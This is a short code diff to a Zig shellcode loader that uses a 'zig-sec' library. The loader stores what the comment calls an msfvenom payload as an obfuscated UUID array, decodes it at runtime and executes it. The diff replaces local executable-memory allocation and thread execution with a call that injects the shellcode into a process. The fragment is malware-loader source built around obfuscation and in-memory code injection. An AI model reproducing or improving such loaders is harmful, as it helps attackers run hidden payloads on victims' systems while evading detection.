@@ -4,6 +4,8 @@ const sec = @import("zig-sec");
 const code_injection = sec.code_injection;
 const payload_obfuscation = sec.payload_obfuscation;
 
+// I think there is a problem with this msfvenom payload. I got a segmentation fault
+// error that doesn't appear when I use dummy code instead.
 const uuid_array = [_][:0]const u8{
     "E48348FC-E8F0-00C0-0000-415141505251",
     "D2314856-4865-528B-6048-8B5218488B52",
@@ -33,10 +35,5 @@ pub fn main() !void {
     const payload = try payload_obfuscation.uuid.deobfuscate(allocator, &uuid_array);
     defer allocator.free(payload);
 
-    const executable_payload = try code_injection.local.allocateExecutableMemory(payload);
-    defer code_injection.local.freeVirtualMemory(executable_payload);
-
-    @memset(payload, 0);
-
-    try code_injection.local.executeInNewThread(@ptrCast(executable_payload), null);
+    try code_injection.local.injectShellCodeToProcess(payload);
 }
